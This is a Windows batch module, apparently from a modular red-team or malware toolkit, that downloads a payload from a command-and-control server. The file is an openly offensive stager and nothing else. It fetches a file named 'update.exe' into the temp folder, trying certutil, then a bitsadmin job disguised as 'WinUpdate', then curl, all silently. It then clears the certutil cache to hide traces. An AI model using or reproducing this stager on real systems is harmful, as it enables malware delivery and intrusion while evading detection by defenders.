REM provides: delivery_download
REM depends: (none)
REM description: Download a payload from C2 using certutil, bitsadmin, or curl

if not defined C2_IP set "C2_IP=10.0.2.2"
if not defined C2_PORT set "C2_PORT=9001"
if not defined PAYLOAD_NAME set "PAYLOAD_NAME=update.exe"
if not defined PAYLOAD_URL set "PAYLOAD_URL=http://%C2_IP%:%C2_PORT%/%PAYLOAD_NAME%"

set "DL_PATH=%TEMP%\%PAYLOAD_NAME%"

REM Try certutil first (most reliable LOLBin downloader)
certutil -urlcache -split -f "%PAYLOAD_URL%" "%DL_PATH%" >nul 2>nul
if exist "%DL_PATH%" goto :dl_done

REM Fallback to bitsadmin
bitsadmin /transfer "WinUpdate" /download /priority high "%PAYLOAD_URL%" "%DL_PATH%" >nul 2>nul
if exist "%DL_PATH%" goto :dl_done

REM Fallback to curl
curl -s -o "%DL_PATH%" "%PAYLOAD_URL%" >nul 2>nul

:dl_done
REM Clean certutil cache
certutil -urlcache -split -f "%PAYLOAD_URL%" delete >nul 2>nul
